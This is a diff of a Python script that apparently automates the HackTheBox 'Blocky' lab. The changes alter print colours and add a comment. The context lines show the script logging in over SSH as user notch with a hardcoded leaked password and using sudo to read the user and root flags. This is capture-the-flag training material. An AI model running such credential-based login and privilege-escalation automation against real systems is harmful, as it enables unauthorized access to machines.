@@ -47,7 +47,7 @@ if not updated:
     new_lines.append(new_entry)
     print(Fore.GREEN + "[+] Added blocky.htb to /etc/hosts")
 else:
-    print(Fore.YELLOW + "[*] Updated blocky.htb IP in /etc/hosts")
+    print(Fore.RED + "[*] Updated blocky.htb IP in /etc/hosts")
 
 with open(HOSTS_FILE, "w") as f:
     f.writelines(new_lines)
@@ -126,7 +126,7 @@ def decompile_class():
         found = False
         for line in result.stdout.splitlines():
             if "#22" in line:
-                print(Fore.GREEN + line)
+                print(Fore.WHITE + line)
                 found = True
 
         if not found:
@@ -147,7 +147,7 @@ while True:
         print(Fore.BLUE + "[*] Exploitating Sudo Privileges of User Notch and Grabbing Flags!\n")
         sudo_pass = "8YsqfCTnvxAUeduzjNSXe22"
         config = Config(overrides={'sudo': {'password': sudo_pass}})
-
+        #here is how I connect to SSH using python and fabric
         conn = Connection(f'notch@{ipaddr}', config=config, connect_kwargs={"password": "8YsqfCTnvxAUeduzjNSXe22"})     
 
         print(Fore.GREEN + "[*]User and Root flags are shown after [sudo] password:\n")
@@ -161,5 +161,6 @@ while True:
         break
     else:
         print("Please enter yes or no.")
+
 
 
